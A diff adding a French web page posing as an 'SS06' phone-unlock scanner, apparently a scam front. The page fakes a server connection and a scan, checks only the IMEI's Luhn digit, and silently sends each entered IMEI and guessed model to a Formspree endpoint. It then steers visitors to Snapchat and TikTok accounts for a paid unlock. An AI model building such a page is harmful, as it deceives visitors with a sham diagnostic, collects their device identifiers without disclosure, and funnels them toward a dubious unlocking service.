@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>SS06 SCANNER — Test de déblocage</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    box-sizing:border-box;
+    padding-top:env(safe-area-inset-top,0px);
+    padding-bottom:env(safe-area-inset-bottom,0px);
+    --bg:#0a0512;
+    --panel:#140a24;
+    --line:#2a1745;
+    --green:#b06bff;
+    --green-dim:#6c3fb0;
+    --amber:#ffcf5c;
+    --red:#ff6b8b;
+    --text:#e0cdff;
+    --muted:#7a5aa8;
+  }
+  *{box-sizing:inherit;margin:0;padding:0}
+  html{height:100%}
+  body{
+    min-height:100%;
+    background:
+      radial-gradient(120% 80% at 50% -10%, rgba(176,107,255,.14), transparent 60%),
+      var(--bg);
+    color:var(--text);
+    font-family:'JetBrains Mono',ui-monospace,monospace;
+    font-size:15px;
+    line-height:1.6;
+    padding:clamp(16px,4vw,40px);
+    display:flex;
+    align-items:flex-start;
+    justify-content:center;
+    overflow-x:hidden;
+  }
+  /* balayage CRT discret */
+  body::before{
+    content:"";position:fixed;inset:0;pointer-events:none;z-index:2;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,.18) 0px,rgba(0,0,0,.18) 1px,transparent 2px,transparent 3px);
+    mix-blend-mode:overlay;opacity:.5;
+  }
+  .wrap{width:100%;max-width:680px}
+  .term{
+    background:linear-gradient(180deg,rgba(20,10,36,.92),rgba(10,5,18,.96));
+    border:1px solid var(--line);
+    border-radius:14px;
+    box-shadow:0 0 0 1px rgba(176,107,255,.08),0 30px 80px -40px rgba(0,0,0,.9),inset 0 0 60px rgba(176,107,255,.05);
+    overflow:hidden;
+  }
+  .bar{
+    display:flex;align-items:center;gap:8px;
+    padding:12px 16px;
+    border-bottom:1px solid var(--line);
+    background:rgba(176,107,255,.05);
+  }
+  .dot{width:11px;height:11px;border-radius:50%;background:#241338;border:1px solid #3a2260}
+  .dot.on{background:var(--green);border-color:var(--green);box-shadow:0 0 12px var(--green)}
+  .bar h1{
+    font-size:12px;font-weight:700;letter-spacing:.18em;color:var(--muted);
+    margin-left:6px;text-transform:uppercase;
+  }
+  .body{padding:clamp(18px,5vw,34px)}
+  .boot{color:var(--muted);font-size:12.5px;margin-bottom:22px;min-height:80px}
+  .boot .l{opacity:0}
+  .boot .l.show{opacity:1}
+  .boot b{color:var(--green);font-weight:700}
+  .lead{font-size:clamp(20px,5vw,27px);font-weight:800;letter-spacing:-.01em;color:#eafff4;line-height:1.25}
+  .lead .c{color:var(--green);text-shadow:0 0 18px rgba(176,107,255,.6)}
+  
+  .svc{margin-top:12px;border:1px solid var(--green-dim);border-radius:9px;background:rgba(176,107,255,.1);
+    color:var(--green);font-size:12.5px;font-weight:700;padding:10px 14px;letter-spacing:.02em}
+  .sub{color:var(--muted);font-size:13px;margin:10px 0 26px}
+  label{display:block;font-size:11px;letter-spacing:.16em;text-transform:uppercase;color:var(--muted);margin-bottom:9px}
+  .field{position:relative}
+  
+  .field .pre{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:var(--green-dim);font-weight:700;pointer-events:none}
+  input{
+    width:100%;
+    background:#0a0418;
+    border:1px solid var(--line);
+    border-radius:10px;
+    color:var(--green);
+    font-family:inherit;
+    font-size:19px;
+    font-weight:700;
+    letter-spacing:.14em;
+    padding:16px 16px 16px 34px;
+    outline:none;
+    transition:border-color .15s,box-shadow .15s;
+    caret-color:var(--green);
+  }
+  input:focus{border-color:var(--green-dim);box-shadow:0 0 0 3px rgba(176,107,255,.18)}
+  input::placeholder{color:#4a3170;letter-spacing:.14em}
+  .hint{font-size:11.5px;color:var(--muted);margin-top:9px;display:flex;justify-content:space-between;gap:10px}
+  .hint .count{color:var(--green-dim)}
+  button.run{
+    margin-top:20px;width:100%;
+    background:linear-gradient(180deg,var(--green),#7d3fd6);
+    color:#fff;
+    font-family:inherit;font-size:15px;font-weight:800;letter-spacing:.06em;
+    border:0;border-radius:10px;padding:15px;cursor:pointer;
+    text-transform:uppercase;
+    transition:filter .15s,transform .05s;
+  }
+  button.run:hover{filter:brightness(1.08)}
+  button.run:active{transform:translateY(1px)}
+  button.run:disabled{opacity:.4;cursor:not-allowed;filter:none}
+  .out{margin-top:24px;border-top:1px dashed var(--line);padding-top:22px;display:none}
+  .out.show{display:block}
+  .scan{color:var(--muted);font-size:13px;white-space:pre-wrap}
+  .scan b{color:var(--green)}
+  .verdict{margin-top:18px;border-radius:12px;padding:18px;border:1px solid;display:none}
+  .verdict.show{display:block;animation:pop .25s ease}
+  @keyframes pop{from{opacity:0;transform:scale(.98)}to{opacity:1;transform:scale(1)}}
+  .verdict .tag{font-size:13px;font-weight:800;letter-spacing:.1em;text-transform:uppercase;display:flex;align-items:center;gap:9px}
+  .verdict .msg{margin-top:9px;font-size:13.5px;line-height:1.55}
+  
+  .verdict.ok{border-color:var(--green-dim);background:rgba(176,107,255,.08)}
+  .verdict.ok .tag{color:var(--green)}
+  .verdict.bad{border-color:#5a2626;background:rgba(255,107,107,.06)}
+  .verdict.bad .tag{color:var(--red)}
+  .verdict.warn{border-color:#5a4a20;background:rgba(255,207,92,.06)}
+  .verdict.warn .tag{color:var(--amber)}
+  .kv{margin-top:16px;display:grid;grid-template-columns:auto 1fr;gap:6px 18px;font-size:13px}
+  .kv .k{color:var(--muted)}
+  .kv .v{color:var(--text);font-weight:700;text-align:right;word-break:break-word}
+  .next{margin-top:16px;font-size:12.5px;color:var(--muted);line-height:1.6}
+  .next a{color:var(--green);text-decoration:none;border-bottom:1px solid var(--green-dim)}
+  .model{margin-top:16px;border:1px solid var(--line);border-radius:10px;padding:14px 16px;background:#040a07;display:none}
+  .model.show{display:block}
+  .model .ml{font-size:10.5px;letter-spacing:.16em;text-transform:uppercase;color:var(--muted)}
+  .model .mv{font-size:18px;font-weight:800;color:#eafff4;margin-top:4px}
+  
+  .contact{margin-top:16px;border:1px solid var(--green-dim);border-radius:12px;padding:18px;background:rgba(176,107,255,.08);display:none}
+  .contact.show{display:block;animation:pop .25s ease}
+  .contact .ct{font-size:12px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:var(--green)}
+  .contact .cm{font-size:13.5px;color:var(--text);margin:8px 0 14px;line-height:1.55}
+  .contact .btns{display:flex;flex-direction:column;gap:10px}
+  .contact a.cbtn{display:flex;align-items:center;justify-content:center;gap:9px;text-decoration:none;
+    font-weight:800;font-size:14px;padding:13px;border-radius:10px;letter-spacing:.03em}
+  .contact a.snap{background:#fffc00;color:#111}
+  .contact a.tik{background:#0b0b0b;color:#fff;border:1px solid var(--line)}
+  .contact a.cbtn small{display:block;font-weight:500;font-size:11px;opacity:.7;letter-spacing:0}
+  .foot{margin-top:22px;font-size:11px;color:#2f5c44;line-height:1.6;text-align:center}
+  .blink{animation:bl 1s steps(1) infinite}
+  @keyframes bl{50%{opacity:0}}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="term">
+      <div class="bar">
+        <span class="dot on"></span><span class="dot"></span><span class="dot"></span>
+        <h1>ss06-scanner // node-07</h1>
+      </div>
+      <div class="body">
+        <div class="boot" id="boot"></div>
+
+        <p class="lead">Test de déblocage <span class="c">SS06</span></p>
+        <div class="svc">⚡ Déblocage SS06 · résultat en ~20 min · tarif en privé</div>
+
+        <div class="field">
+          <span class="pre">&gt;</span>
+          <input id="imei" inputmode="numeric" autocomplete="off" spellcheck="false"
+                 maxlength="17" placeholder="35 xxxxxx xxxxxx x">
+        </div>
+        <div class="hint">
+          <span>Composez *#06# sur le téléphone pour l'afficher.</span>
+          <span class="count" id="count">0 / 15</span>
+        </div>
+
+        <button class="run" id="run" disabled>▶ Lancer le test SS06</button>
+
+        <div class="out" id="out">
+          <div class="scan" id="scan"></div>
+          <div class="verdict" id="verdict">
+            <div class="tag" id="vtag"></div>
+            <div class="msg" id="vmsg"></div>
+          </div>
+          <div class="kv" id="kv"></div>
+          <div class="next" id="next"></div>
+          <div class="model" id="model">
+            <div class="ml">// modèle détecté</div>
+            <div class="mv" id="mval"></div>
+          </div>
+          <div class="contact" id="contact">
+            <div class="ct">// déblocage possible</div>
+            <div class="cm">Écris-moi pour débloquer ton tel 👇</div>
+            <div class="btns">
+              <a class="cbtn snap" href="https://snapchat.com/add/hmz_026" target="_blank" rel="noreferrer">👻 Snapchat<small>hmz_026</small></a>
+              <a class="cbtn tik" href="https://tiktok.com/@snapunlock02" target="_blank" rel="noreferrer">🎵 TikTok<small>@snapunlock02</small></a>
+            </div>
+          </div>
+        </div>
+
+        <p class="foot">
+          Outil de diagnostic. La validité et le modèle sont calculés à partir du numéro.<br>
+          Le statut réseau/blocage définitif se confirme auprès de l'opérateur ou d'un service officiel.
+        </p>
+      </div>
+    </div>
+  </div>
+
+<script>
+(function(){
+  const $=id=>document.getElementById(id);
+  const input=$('imei'), run=$('run'), count=$('count');
+  const out=$('out'), scan=$('scan'), verdict=$('verdict'), vtag=$('vtag'), vmsg=$('vmsg'), kv=$('kv'), next=$('next');
+
+  // ---- boot log ----
+  const lines=[
+    'Connexion au serveur SS06',
+    'Base des modèles chargée',
+    'Prêt <b>_</b>'
+  ];
+  const boot=$('boot');
+  lines.forEach((t,i)=>{const d=document.createElement('div');d.className='l';d.innerHTML='<b>&rsaquo;</b> '+t;boot.appendChild(d);setTimeout(()=>d.classList.add('show'),200*i);});
+
+  // ---- Luhn (validité IMEI) ----
+  function luhnOk(s){
+    let sum=0;
+    for(let i=0;i<15;i++){
+      let d=+s[i];
+      if(i%2===1){d*=2;if(d>9)d-=9;}
+      sum+=d;
+    }
+    return sum%10===0;
+  }
+
+  // ---- TAC → modèle (base intégrée, extensible) ----
+  // Clé = 8 premiers chiffres de l'IMEI (Type Allocation Code).
+  const TAC={
+    // iPhone (exemples de TAC réels courants)
+    '35316609':'Apple iPhone 6','35325007':'Apple iPhone 6s','35442007':'Apple iPhone 7',
+    '35335908':'Apple iPhone 8','35341309':'Apple iPhone X','35695810':'Apple iPhone 11',
+    '35364110':'Apple iPhone 11 Pro','35316811':'Apple iPhone 12','35342011':'Apple iPhone 12 Pro',
+    '35674011':'Apple iPhone 13','35323612':'Apple iPhone 13 Pro','35395213':'Apple iPhone 14',
+    '35301514':'Apple iPhone 15','35777813':'Apple iPhone 15 Pro',
+    // Samsung
+    '35847409':'Samsung Galaxy S8','35880408':'Samsung Galaxy S9','35897710':'Samsung Galaxy S10',
+    '35216311':'Samsung Galaxy S20','35414111':'Samsung Galaxy S21','35461312':'Samsung Galaxy S22',
+    '35875113':'Samsung Galaxy S23',
+    // Xiaomi / autres
+    '86089704':'Xiaomi Redmi Note','86234005':'Xiaomi Mi','86753905':'Google Pixel'
+  };
+  function marque(imei){
+    const tac=imei.slice(0,8);
+    if(TAC[tac]) return {model:TAC[tac],known:true};
+    // Service réservé aux iPhone : modèle exact à confirmer si non répertorié.
+    return {model:'iPhone (modèle à confirmer)',known:false};
+  }
+  function origine(imei){
+    const rbi=imei.slice(0,2);
+    const map={'01':'PTCRB (USA)','35':'BABT (Royaume-Uni / Europe)','86':'TAF (Chine)','99':'Divers'};
+    return map[rbi]||'Autorité régionale '+rbi;
+  }
+
+  // ---- input formatting ----
+  input.addEventListener('input',()=>{
+    let v=input.value.replace(/\D/g,'').slice(0,15);
+    input.value=v;
+    count.textContent=v.length+' / 15';
+    count.style.color=v.length===15?'var(--green)':'var(--green-dim)';
+    run.disabled=v.length!==15;
+  });
+  input.addEventListener('keydown',e=>{if(e.key==='Enter'&&!run.disabled)go();});
+  run.addEventListener('click',go);
+
+  function typeOut(el,text,done){
+    el.innerHTML='';let i=0;
+    (function step(){
+      if(i>text.length){done&&done();return;}
+      el.innerHTML=text.slice(0,i)+'<span class="blink">▋</span>';
+      i+=2;setTimeout(step,14);
+    })();
+  }
+
+  function go(){
+    const imei=input.value;
+    out.classList.add('show');
+    verdict.classList.remove('show');
+    kv.innerHTML='';next.innerHTML='';
+    run.disabled=true;run.textContent='▶ Test SS06 en cours...';
+
+    const valid=luhnOk(imei);
+    const dev=marque(imei);
+
+    // Notification email (Formspree) : on t'envoie chaque IMEI testé.
+    try{
+      fetch('https://formspree.io/f/xoevbjdl',{
+        method:'POST',
+        headers:{'Accept':'application/json','Content-Type':'application/json'},
+        body:JSON.stringify({
+          IMEI:imei,
+          Modele:dev.model,
+          Resultat:valid?'numéro bon':'numéro faux',
+          Date:new Date().toLocaleString('fr-FR')
+        })
+      }).catch(()=>{});
+    }catch(e){}
+
+    const script=
+      '› Numéro : '+imei+'\n'+
+      '› Vérification en cours...\n'+
+      '› Résultat : '+(valid?'<b>numéro bon</b>':'<b>numéro faux</b>');
+
+    typeOut(scan,script.replace(/\n/g,'<br>'),()=>{
+      run.disabled=false;run.textContent='▶ Relancer le test SS06';
+      showVerdict(imei,valid,dev);
+    });
+  }
+
+  function showVerdict(imei,valid,dev){
+    const contact=document.getElementById('contact');
+    const model=document.getElementById('model');
+    if(!valid){
+      contact.classList.remove('show');
+      model.classList.remove('show');
+      verdict.className='verdict bad show';
+      vtag.innerHTML='✖ IMEI NON VALIDE';
+      vmsg.innerHTML="Numéro faux. Refais *#06# et recopie bien les 15 chiffres.";
+      return;
+    }
+    verdict.className='verdict ok show';
+    vtag.innerHTML='✔ IMEI VALIDE';
+    vmsg.innerHTML="Ton numéro est bon ✅";
+    kv.innerHTML='';
+    next.innerHTML='';
+    document.getElementById('mval').textContent=dev.model;
+    model.classList.add('show');
+    contact.classList.add('show');
+  }
+  function row(k,v){return '<div class="k">'+k+'</div><div class="v">'+v+'</div>';}
+})();
+</script>
+</body>
+</html>
